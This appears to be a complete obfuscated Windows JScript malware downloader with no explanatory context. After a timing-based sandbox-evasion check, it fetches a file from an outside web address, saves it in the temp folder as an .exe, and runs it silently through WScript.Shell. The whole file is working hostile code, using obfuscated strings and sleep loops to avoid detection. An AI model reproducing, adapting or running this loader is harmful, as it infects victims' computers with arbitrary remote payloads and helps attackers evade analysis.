var w = false;
var U = "CreateObject";
var P = function R() {return WScript[U]("WScript.Shell");}(), y0 = 11;
var X1 = "MSXML2.XMLHTTP";
var L0 = 2123213;
var X0 = 0;
function Ik(h){P["Run"](h, X0, X0);};
function G(){return "" + X1;};
function O(MP, E){X0 = X0 * 1; return MP - E;};
function L(){return U;};
/*@cc_on
  @if (@_win32 || @_win64)
    w = true;
  @end
@*/
if (w)
{
var xT = "";
function y(){return 22;};
var v = 0; var g = 0;
function M()
{
var Yg = new this["Date"]();
var O0 = Yg["getUTCMilliseconds"]();
WScript["Sleep"](y());
var Yg = new this["Date"]();
var ZE = Yg["getUTCMilliseconds"]();
WScript["Sleep"](y());
var Yg = new this["Date"]();
var q = Yg["getUTCMilliseconds"]();
var v = "TP";
v = O(ZE, O0);
var g = "ea";
g = O(q, ZE);
xT = "open";
return O(v, g);
}
var Ti = false;
var Z = false;
for (var rD = X0; rD < y() * 1; rD++){if (M() != X0){
Ti = true; 
g = "31" + 11 * v + g; 
Z = true; 
break;
}}
function X() {return ((Ti == true) && (Ti == Z)) ? 1 : X0;};
if (Ti && X() && Z){
function WW() {return P["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "JcWoz53K.exe";};
 t = G();
 j = WScript[U](t);
 var ba = 1;
 while (ba){
try {
j[xT]("GET", "http://www.the2ndedit.com/j1oisa", false);
j["send"]();
lm = "Sleep";
for (;;){WScript[lm](y() * 11); if (j["readystate"] >= 2 * 2) break;};
ba = X0;
} catch(Vj){};
}
function LN(og) {var Dg = (1, 2, 3, 4, 5, og); return Dg;};
Dx = WScript[L()]("ADODB.Stream");
t = Dx;
t[xT]();
t["type"] = LN(1);
t["write"](j["ResponseBody"]);
Dx["position"] = LN(X0);
t["Save" + "ToFile"](WW(), 2);
Dx["c"+"lose"]();
WB = WW();
Ik(WB);
}
}

